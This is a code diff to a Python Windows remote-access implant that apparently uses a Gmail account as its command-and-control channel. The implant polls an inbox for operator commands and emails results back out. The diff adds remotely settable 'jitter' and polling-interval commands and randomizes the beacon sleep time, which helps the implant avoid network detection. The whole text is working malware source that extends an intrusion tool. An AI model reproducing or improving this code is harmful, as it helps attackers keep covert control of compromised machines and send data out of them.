@@ -23,9 +23,9 @@
 
 __author__ = "maldevel"
 __copyright__ = "Copyright (c) 2016 @maldevel"
-__credits__ = ["maldevel", "carnal0wnage", "byt3bl33d3r"]
+__credits__ = ["maldevel", "carnal0wnage", "byt3bl33d3r", "haydnjohnson"]
 __license__ = "GPLv3"
-__version__ = "1.1"
+__version__ = "1.2"
 __maintainer__ = "maldevel"
 
 
@@ -50,6 +50,7 @@ import netifaces
 import urllib2
 import urllib
 import pythoncom
+import random
 
 from win32com.client import GetObject
 from enum import Enum
@@ -74,7 +75,8 @@ gmail_pwd = '!y0ur_p@ssw0rd!'
 server = "smtp.gmail.com"
 server_port = 587
 AESKey = 'my_AES_key'
-EMAIL_KNOCK_TIMEOUT = 60 #seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
+EMAIL_KNOCK_TIMEOUT = 60  # seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
+JITTER = 100
 TAG = 'RELEASE'
 VERSION = '1.0.0'
 #######################################
@@ -740,6 +742,45 @@ class restart(threading.Thread):
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
+
+class jitter(threading.Thread ):
+
+    def __init__(self, command, jobid):
+        threading.Thread.__init__(self)
+        self.command = command
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            global JITTER
+            JITTER = self.command
+            sendEmail({'cmd': 'jitter', 'res': 'Success with Changing Jitter too %s Seconds' %str(JITTER)}, jobid=self.jobid)
+
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
+
+class email_check(threading.Thread ):
+
+    def __init__(self, command, jobid):
+        threading.Thread.__init__(self)
+        self.command = command
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            global EMAIL_KNOCK_TIMEOUT
+            EMAIL_KNOCK_TIMEOUT = self.command
+            sendEmail({'cmd': 'email_check', 'res': 'Success with changing Email Check in time too %s Seconds' %str(EMAIL_KNOCK_TIMEOUT)}, jobid=self.jobid)
+            time.sleep(3)
+
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
         
         
 class logoff(threading.Thread):
@@ -955,7 +996,8 @@ class sendEmail(threading.Thread):
 
 def checkJobs():
     #Here we check the inbox for queued jobs, parse them and start a thread
-
+    #EMAIL_KNOCK_TIMEOUT = 60  # seconds - check for new commands/jobs every EMAIL_KNOCK_TIMEOUT seconds
+    #JITTER = 100
     while True:
 
         try:
@@ -1037,11 +1079,32 @@ def checkJobs():
                     elif cmd == 'forcecheckin':
                         sendEmail("Host checking in as requested", checkin=True)
 
+                    elif cmd == 'email_check':
+                        email_check(arg, jobid)
+                        #EMAIL_KNOCK_TIMEOUT = int(arg)
+                        sendEmail("Email Checking changed too: %s seconds" % str(arg), checkin=True)
+
+                    elif cmd == 'jitter':
+
+                        jitter(arg, jobid)
+                        #JITTER = int(arg)
+                        sendEmail("JITTER UPDATED too: %s seconds" % str(arg), checkin=True)
+
+
                     else:
                         raise NotImplementedError
 
             c.logout()
-            time.sleep(EMAIL_KNOCK_TIMEOUT)
+
+
+            if JITTER != 100:
+                JITTER_HIGH =((EMAIL_KNOCK_TIMEOUT * JITTER) /100.0) * 3
+                JITTER_LOW = (EMAIL_KNOCK_TIMEOUT * JITTER) /100.0
+
+                time.sleep(random.randrange(JITTER_LOW, JITTER_HIGH))
+            else:
+                time.sleep(EMAIL_KNOCK_TIMEOUT)
+
         
         except Exception as e:
             #logging.debug(format_exc())
